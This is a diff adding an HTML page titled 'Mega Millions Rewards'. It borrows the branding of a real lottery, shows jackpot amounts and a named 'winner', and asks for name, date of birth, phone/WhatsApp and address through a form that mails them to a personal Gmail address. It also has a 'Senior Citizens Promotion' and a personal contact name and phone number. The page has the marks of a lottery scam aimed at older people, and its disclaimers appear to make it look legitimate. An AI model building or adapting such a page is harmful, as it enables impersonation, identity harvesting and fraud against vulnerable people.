@@ -1,0 +1,290 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Mega Millions Rewards</title>
+<style>
+:root{
+  --blue:#082b68;
+  --blue2:#0d4aa2;
+  --gold:#f4b400;
+  --gold2:#ffd75a;
+  --ink:#10213d;
+  --light:#f4f7fb;
+  --white:#fff;
+  --muted:#65748b;
+}
+*{box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  margin:0;
+  font-family:Arial,Helvetica,sans-serif;
+  background:var(--light);
+  color:var(--ink);
+}
+a{text-decoration:none}
+.header{
+  position:sticky;top:0;z-index:20;
+  background:linear-gradient(135deg,var(--blue),var(--blue2));
+  color:#fff;
+  box-shadow:0 3px 16px rgba(0,0,0,.18);
+}
+.nav{
+  max-width:1180px;margin:auto;padding:15px 20px;
+  display:flex;align-items:center;justify-content:space-between;gap:20px;
+}
+.logo{font-size:23px;font-weight:900;letter-spacing:.4px}
+.logo span{color:var(--gold2)}
+.navlinks{display:flex;gap:18px;flex-wrap:wrap;justify-content:flex-end}
+.navlinks a{color:#fff;font-size:13px;font-weight:800}
+.hero{
+  background:
+    radial-gradient(circle at 80% 20%,rgba(244,180,0,.20),transparent 25%),
+    linear-gradient(135deg,#061d48,#0b4b9f);
+  color:#fff;
+  padding:54px 20px 70px;
+}
+.hero-inner{max-width:1180px;margin:auto}
+.eyebrow{font-size:13px;font-weight:900;letter-spacing:1.8px;color:#dce9ff}
+h1{font-size:clamp(40px,7vw,78px);line-height:.95;margin:12px 0 18px}
+.hero p{max-width:700px;color:#e6efff;line-height:1.65;font-size:16px}
+.balls{display:flex;gap:12px;flex-wrap:wrap;margin:30px 0}
+.ball{
+  width:54px;height:54px;border-radius:50%;
+  display:flex;align-items:center;justify-content:center;
+  background:#fff;color:#17315d;font-size:18px;font-weight:900;
+  box-shadow:0 9px 18px rgba(0,0,0,.24);
+  animation:bounce 1.55s ease-in-out infinite;
+}
+.ball.gold{background:linear-gradient(145deg,#ffd75a,#e59c00);color:#392600}
+.ball:nth-child(2){animation-delay:.12s}
+.ball:nth-child(3){animation-delay:.24s}
+.ball:nth-child(4){animation-delay:.36s}
+.ball:nth-child(5){animation-delay:.48s}
+.ball:nth-child(6){animation-delay:.60s}
+@keyframes bounce{
+  0%,100%{transform:translateY(0) rotate(0deg)}
+  50%{transform:translateY(-17px) rotate(7deg)}
+}
+.hero-grid{
+  display:grid;grid-template-columns:1.15fr .85fr;gap:24px;align-items:stretch
+}
+.jackpot{
+  background:rgba(255,255,255,.98);color:var(--ink);
+  border-radius:22px;padding:28px;
+  box-shadow:0 18px 38px rgba(0,0,0,.22);
+  animation:pulse 2.5s ease-in-out infinite;
+}
+@keyframes pulse{50%{transform:scale(1.018)}}
+.jackpot-label{font-weight:900;color:#53647c;letter-spacing:1px}
+.amount{font-size:clamp(50px,8vw,86px);font-weight:1000;color:var(--blue);margin:7px 0}
+.cash{font-size:14px;color:var(--muted)}
+.cta-row{display:flex;gap:12px;flex-wrap:wrap;margin-top:22px}
+.btn{
+  display:inline-flex;align-items:center;justify-content:center;
+  min-height:48px;padding:0 20px;border-radius:10px;
+  font-weight:900;border:2px solid transparent;
+}
+.btn-gold{background:var(--gold);color:#17120a}
+.btn-light{background:#fff;color:var(--blue)}
+.btn-outline{background:transparent;border-color:#b9d3ff;color:#fff}
+.section{max-width:1180px;margin:auto;padding:58px 20px}
+.section h2{font-size:32px;margin:0 0 12px}
+.lead{color:var(--muted);line-height:1.6;max-width:760px}
+.cards{display:grid;grid-template-columns:repeat(3,1fr);gap:18px;margin-top:25px}
+.card{
+  background:#fff;border-radius:18px;padding:24px;
+  box-shadow:0 7px 22px rgba(15,38,75,.08);
+  border:1px solid #e2e9f3;
+}
+.card .big{font-size:30px;font-weight:1000;color:var(--blue);margin:8px 0}
+.winners{display:grid;grid-template-columns:repeat(2,1fr);gap:18px;margin-top:24px}
+.winner{background:#fff;border-left:6px solid var(--gold);border-radius:15px;padding:22px;box-shadow:0 7px 22px rgba(15,38,75,.08)}
+.badge{display:inline-block;background:#e8f1ff;color:var(--blue);padding:6px 10px;border-radius:999px;font-size:11px;font-weight:900;margin-top:10px}
+.form-wrap{background:#fff;border-radius:22px;padding:26px;box-shadow:0 8px 28px rgba(15,38,75,.09);margin-top:25px}
+.form{display:grid;grid-template-columns:1fr 1fr;gap:16px}
+.field{display:flex;flex-direction:column;gap:7px}
+.field.full{grid-column:1/-1}
+label{font-size:13px;font-weight:900;color:#34445d}
+input,select,textarea{
+  width:100%;border:1px solid #cbd6e5;border-radius:10px;
+  padding:13px 14px;font:inherit;background:#fbfdff;
+}
+textarea{min-height:120px;resize:vertical}
+.notice{
+  margin-top:18px;padding:14px 16px;border-radius:12px;
+  background:#fff8e1;border:1px solid #f1d27a;color:#5d4900;
+  font-size:13px;line-height:1.55;
+}
+footer{background:#071b3d;color:#d8e4f8;padding:35px 20px}
+.footer-inner{max-width:1180px;margin:auto}
+.footer-note{font-size:12px;line-height:1.65;color:#b8c7df;max-width:900px}
+@media(max-width:800px){
+  .hero-grid,.cards,.winners,.form{grid-template-columns:1fr}
+  .nav{align-items:flex-start;flex-direction:column}
+  .navlinks{justify-content:flex-start}
+  .field.full{grid-column:auto}
+}
+@media(prefers-reduced-motion:reduce){
+  html{scroll-behavior:auto}
+  .ball,.jackpot{animation:none}
+}
+
+.senior-promo{
+  margin-top:25px;
+  background:linear-gradient(135deg,#fffaf0,#fff);
+  border:1px solid #efd27a;
+  border-radius:18px;
+  padding:22px;
+  box-shadow:0 7px 22px rgba(15,38,75,.07);
+}
+.senior-promo h3{margin:0 0 8px;color:#082b68;font-size:22px}
+.senior-promo p{margin:0;color:#53647c;line-height:1.6}
+
+</style>
+</head>
+<body>
+
+<header class="header">
+  <nav class="nav">
+    <div class="logo">MEGA <span>MILLIONS</span> REWARDS</div>
+    <div class="navlinks">
+      <a href="#home">HOME</a>
+      <a href="#numbers">WINNING NUMBERS</a>
+      <a href="#jackpot">JACKPOT</a>
+      <a href="#winners">WINNERS</a>
+      <a href="#join">JOIN</a>
+      <a href="#contact">CONTACT</a>
+    </div>
+  </nav>
+</header>
+
+<main id="home">
+<section class="hero">
+  <div class="hero-inner">
+    <div class="eyebrow">JACKPOT INFORMATION • NEXT DRAW</div>
+    <div class="hero-grid">
+      <div>
+        <h1>MEGA JACKPOT</h1>
+        <p>View the latest numbers, jackpot information, winner announcements and participant information in one mobile-friendly place.</p>
+        <div class="balls" aria-label="Displayed number balls">
+          <div class="ball">12</div>
+          <div class="ball">24</div>
+          <div class="ball">37</div>
+          <div class="ball">48</div>
+          <div class="ball">61</div>
+          <div class="ball gold">09</div>
+        </div>
+        <div class="cta-row">
+          <a class="btn btn-gold" href="https://www.megamillions.com/" target="_blank" rel="noopener">BUY / FIND A TICKET</a>
+          <a class="btn btn-outline" href="#join">PARTICIPANT INFORMATION</a>
+        </div>
+      </div>
+
+      <div class="jackpot" id="jackpot">
+        <div class="jackpot-label">ESTIMATED JACKPOT</div>
+        <div class="amount" id="amount">$0.0M</div>
+        <div class="cash">Cash option information</div>
+        <div class="notice"><strong>DRAWING:</strong> TO BE ANNOUNCED</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section class="section" id="numbers">
+  <h2>Winning Numbers</h2>
+  <p class="lead">Numbers displayed here can be updated as new results become available.</p>
+  <div class="balls">
+    <div class="ball">12</div><div class="ball">24</div><div class="ball">37</div>
+    <div class="ball">48</div><div class="ball">61</div><div class="ball gold">09</div>
+  </div>
+</section>
+
+<section class="section">
+  <h2>Jackpot &amp; Draw Information</h2>
+  <div class="cards">
+    <div class="card"><div class="big">$2.5 MILLION</div><strong>Estimated Jackpot</strong></div>
+    <div class="card"><div class="big">$25,000</div><strong>Featured Prize Information</strong></div>
+    <div class="card"><div class="big">TO BE ANNOUNCED</div><strong>Next Drawing</strong></div>
+  </div>
+</section>
+
+<section class="section" id="winners">
+  <h2>Winner Announcements</h2>
+  <div class="winners">
+    <div class="winner">
+      <strong>Nathan Wilson SNR</strong><br>
+      Brooklyn, New York<br>
+      <span class="badge">CONFIRMED ENTRY</span>
+    </div>
+  </div>
+</section>
+
+<section class="section" id="join">
+  <h2>Participant Information</h2>
+  <p class="lead">Use this form for contact or participant requests. Do not enter payment-card details, passwords, PINs, or Social Security numbers.</p>
+  <div class="form-wrap">
+    <form class="form" action="mailto:peterjohnsonfromamerica@gmail.com" method="post" enctype="text/plain">
+      <div class="field"><label>Full Name *</label><input required name="Full Name" autocomplete="name"></div>
+      <div class="field"><label>Date of Birth *</label><input required type="date" name="Date of Birth" autocomplete="bday"></div>
+      <div class="field"><label>Email Address *</label><input required type="email" name="Email" autocomplete="email"></div>
+      <div class="field"><label>Phone / WhatsApp Number *</label><input required type="tel" name="Phone / WhatsApp" autocomplete="tel"></div>
+      <div class="field"><label>City / State / Country</label><input name="Location" autocomplete="address-level2"></div>
+      <div class="field"><label>Address / Mailing Address</label><input name="Address" autocomplete="street-address"></div>
+      <div class="field full">
+        <label>Request</label>
+        <select name="Request">
+          <option>General Information</option>
+          <option>Participant Request</option>
+          <option>Winner Information</option>
+          <option>Contact Support</option>
+        </select>
+      </div>
+      <div class="field full"><label>Message</label><textarea name="Message"></textarea></div>
+      <div class="field full"><button class="btn btn-gold" type="submit">SUBMIT REQUEST</button></div>
+    </form>
+    <div class="notice"><strong>Payment safety:</strong> this page does not collect card numbers, CVV codes, PINs or Social Security numbers. Ticket purchases should be completed only through an authorized lottery seller or the applicable official lottery service.</div>
+  </div>
+
+  <div class="senior-promo">
+    <h3>Senior Citizens Promotion</h3>
+    <p>Senior citizens who sign up for our promotion will be automatically entered for consideration in our promotional selection. Eligible participants may be selected according to the promotion's terms.</p>
+  </div>
+</section>
+
+<section class="section" id="contact">
+  <h2>Contact</h2>
+  <p class="lead">Email: <strong>peterjohnsonfromamerica@gmail.com</strong></p>
+  <p class="lead"><strong></strong><br><strong>+1 754-344-1051<br>Randy Morton</strong><br>Senior Representative / Manager</p>
+</section>
+</main>
+
+<footer>
+  <div class="footer-inner">
+    <strong>MEGA MILLIONS REWARDS</strong>
+    <p class="footer-note">
+      This website is an independent site and is not the official Mega Millions website or an authorized lottery ticket seller.
+      Mega Millions tickets are sold through participating lotteries. The Buy / Find a Ticket button above directs visitors to the official Mega Millions website for game information and authorized purchase guidance.
+      Never send card details, passwords, PINs or Social Security numbers through a public contact form.
+    </p>
+  </div>
+</footer>
+
+<script>
+(function(){
+  const el=document.getElementById('amount');
+  const target=2.5;
+  const start=performance.now();
+  const duration=1500;
+  function tick(now){
+    const p=Math.min((now-start)/duration,1);
+    const eased=1-Math.pow(1-p,3);
+    el.textContent='$'+(target*eased).toFixed(1)+'M';
+    if(p<1) requestAnimationFrame(tick);
+  }
+  requestAnimationFrame(tick);
+})();
+</script>
+</body>
+</html>
